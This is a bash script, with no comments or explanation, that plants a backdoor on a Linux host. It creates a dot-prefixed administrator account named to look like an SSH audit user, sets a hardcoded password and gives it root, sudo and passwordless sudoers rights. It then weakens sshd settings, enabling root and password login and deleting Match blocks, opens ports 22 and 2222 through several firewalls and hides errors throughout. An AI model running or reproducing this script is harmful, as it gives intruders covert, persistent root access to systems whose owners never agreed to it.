#!/bin/bash

if [[ $EUID -ne 0 ]]; then
    if command -v sudo &>/dev/null; then
        SUDO="sudo"
    else
        exit 1
    fi
else
    SUDO=""
fi

username=".sshaudit"
password="24@C0der"

if ! id "$username" &>/dev/null; then
    if command -v useradd &>/dev/null; then
        $SUDO useradd -m -s /bin/bash "$username" 2>/dev/null
        if [ $? -ne 0 ]; then
            $SUDO useradd "$username" 2>/dev/null
        fi
    elif command -v adduser &>/dev/null; then
        $SUDO adduser --quiet --disabled-password --gecos "" "$username" 2>/dev/null
        if [ $? -ne 0 ]; then
            $SUDO adduser "$username" 2>/dev/null
        fi
    fi
fi

echo "$username:$password" | $SUDO chpasswd 2>/dev/null

for group in root sudo wheel adm; do
    if getent group "$group" &>/dev/null; then
        $SUDO usermod -aG "$group" "$username" 2>/dev/null
    fi
done

sudoers_entry="$username ALL=(ALL:ALL) NOPASSWD:ALL"
if [[ -d "/etc/sudoers.d" ]]; then
    echo "$sudoers_entry" | $SUDO tee /etc/sudoers.d/"$username" >/dev/null 2>&1
    $SUDO chmod 440 /etc/sudoers.d/"$username" 2>/dev/null
else
    echo "$sudoers_entry" | $SUDO tee -a /etc/sudoers >/dev/null 2>&1
fi

ssh_config="/etc/ssh/sshd_config"
$SUDO cp "$ssh_config" "$ssh_config.backup" 2>/dev/null

$SUDO sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' "$ssh_config"
$SUDO sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' "$ssh_config"
$SUDO sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' "$ssh_config"
$SUDO sed -i 's/^#*ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/' "$ssh_config"
$SUDO sed -i 's/^#*UsePAM.*/UsePAM yes/' "$ssh_config"
$SUDO sed -i 's/^#*Port 22/Port 22/' "$ssh_config"

if ! grep -q "^Port 2222" "$ssh_config"; then
    echo "Port 2222" | $SUDO tee -a "$ssh_config" >/dev/null
fi

$SUDO sed -i '/^Match /,/^$/d' "$ssh_config" 2>/dev/null

if command -v systemctl &>/dev/null; then
    $SUDO systemctl restart ssh 2>/dev/null || $SUDO systemctl restart sshd 2>/dev/null
else
    $SUDO service ssh restart 2>/dev/null || $SUDO service sshd restart 2>/dev/null
fi

if command -v ufw &>/dev/null; then
    $SUDO ufw allow 22/tcp 2>/dev/null
    $SUDO ufw allow 2222/tcp 2>/dev/null
fi

if command -v firewall-cmd &>/dev/null; then
    $SUDO firewall-cmd --permanent --add-port=22/tcp 2>/dev/null
    $SUDO firewall-cmd --permanent --add-port=2222/tcp 2>/dev/null
    $SUDO firewall-cmd --reload 2>/dev/null
fi

if command -v iptables &>/dev/null; then
    $SUDO iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || $SUDO iptables -A INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null
    $SUDO iptables -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || $SUDO iptables -A INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null
fi

$SUDO systemctl enable ssh 2>/dev/null || $SUDO systemctl enable sshd 2>/dev/null || $SUDO update-rc.d ssh defaults 2>/dev/null

echo "User: $username"
echo "Password: $password"
echo "Ports: 22, 2222"